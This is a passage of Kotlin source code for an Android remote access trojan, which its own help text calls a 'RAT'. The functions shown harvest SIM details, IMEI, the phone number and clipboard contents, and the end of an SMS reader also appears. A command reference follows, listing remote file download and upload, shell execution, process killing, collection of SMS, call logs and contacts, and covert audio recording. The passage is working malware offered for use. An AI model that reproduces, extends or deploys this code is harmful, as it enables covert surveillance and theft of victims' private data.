            }
            result.toString()
        } catch (e: Exception) {
            "Error reading SMS: ${e.message}\n"
        }
    }

    private fun getSimDetails(): String {
        return try {
            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied: READ_PHONE_STATE required\n"
            }

            val result = StringBuilder()
            result.append("=== SIM DETAILS ===\n\n")

            val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            result.append("Network Operator: ${telephonyManager.networkOperatorName ?: "Unknown"}\n")
            result.append("Network Country: ${telephonyManager.networkCountryIso ?: "Unknown"}\n")
            result.append("SIM Country: ${telephonyManager.simCountryIso ?: "Unknown"}\n")
            result.append("SIM Operator: ${telephonyManager.simOperatorName ?: "Unknown"}\n")
            result.append("SIM State: ${telephonyManager.simState}\n")
            result.append("Phone Type: ${telephonyManager.phoneType}\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                result.append("Network Type: ${telephonyManager.dataNetworkType}\n")
            } else {
                @Suppress("DEPRECATION")
                result.append("Network Type: ${telephonyManager.networkType}\n")
            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    result.append("IMEI: ${telephonyManager.imei ?: "Not available"}\n")
                } else {
                    @Suppress("DEPRECATION")
                    result.append("Device ID: ${telephonyManager.deviceId ?: "Not available"}\n")
                }
            } catch (e: Exception) {
                result.append("Device ID: Not accessible\n")
            }

            try {
                result.append("Phone Number: ${telephonyManager.line1Number ?: "Not available"}\n")
            } catch (e: Exception) {
                result.append("Phone Number: Not accessible\n")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    val subscriptionManager = SubscriptionManager.from(context)
                    val activeSubscriptions = subscriptionManager.activeSubscriptionInfoList

                    if (activeSubscriptions?.isNotEmpty() == true) {
                        result.append("\nSIM Cards:\n")
                        activeSubscriptions.forEachIndexed { index, subInfo ->
                            result.append("  SIM ${index + 1}:\n")
                            result.append("    Display Name: ${subInfo.displayName}\n")
                            result.append("    Carrier: ${subInfo.carrierName}\n")
                            result.append("    Number: ${subInfo.number ?: "Unknown"}\n")
                            result.append("    Country: ${subInfo.countryIso}\n")
                            result.append("    Slot: ${subInfo.simSlotIndex}\n")
                        }
                    } else {
                        result.append("\nNo active SIM cards found\n")
                    }
                } catch (e: Exception) {
                    result.append("\nSIM enumeration error: ${e.message}\n")
                }
            }

            return result.toString()

        } catch (e: Exception) {
            "SIM details error: ${e.message}\n"
        }
    }

    private fun getClipboardData(): String {
        return try {
            val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            if (clipboardManager.hasPrimaryClip()) {
                val clipData = clipboardManager.primaryClip
                val clipText = clipData?.getItemAt(0)?.text?.toString()
                clipText ?: "Empty"
            } else {
                "Empty"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }
    }

    private fun getCompleteHelpText(): String {
        return """
=== COMPLETE RAT COMMAND REFERENCE ===

DEVICE INFORMATION:
  deviceInfo                 --> Complete device information
  getIP                      --> Device IP address
  getMACAddress              --> MAC address information
  getSimDetails              --> SIM card details
  sysinfo                    --> System information (memory, storage, CPU)

FILE OPERATIONS:
  pwd                        --> Show current directory
  cd <path>                  --> Change directory
  ls [path]                  --> List directory contents
  download <file>            --> Download file (base64 encoded)
  upload <name> <data>       --> Upload file from base64 data
  delete <file>              --> Delete file
  mkdir <path>               --> Create directory

SYSTEM OPERATIONS:
  ps                         --> List running processes
  kill <process>             --> Kill process by name
  shell <command>            --> Execute shell command
  netstat                    --> Network connections
  ping <host>                --> Ping host

DATA ACCESS:
  getSMS [inbox|sent]        --> SMS messages
  getCallLogs                --> Call history
  getContacts                --> Contact list
  getApps                    --> Installed applications
  getPhotos                  --> Photo information
  getAudio                   --> Audio files information
  getVideos                  --> Video files information

CLIPBOARD:
  getClipData                --> Get clipboard content
  setClip <text>             --> Set clipboard content

AUDIO RECORDING:
  startAudio                 --> Start audio recording
  stopAudio                  --> Stop and download audio

DEVICE CONTROL:
  vibrate [times]            --> Vibrate device

SYSTEM:
  help                       --> Show this help
  clear                      --> Clear screen
  exit                       --> Close connection

USAGE EXAMPLES:
  ls /sdcard/Download        --> List download folder
  download /sdcard/photo.jpg --> Download a photo
  shell cat /proc/version    --> Get kernel version
  ping google.com            --> Test internet connectivity
  kill com.android.browser   --> Kill browser process

        """.trimIndent() + "\n"
    }
}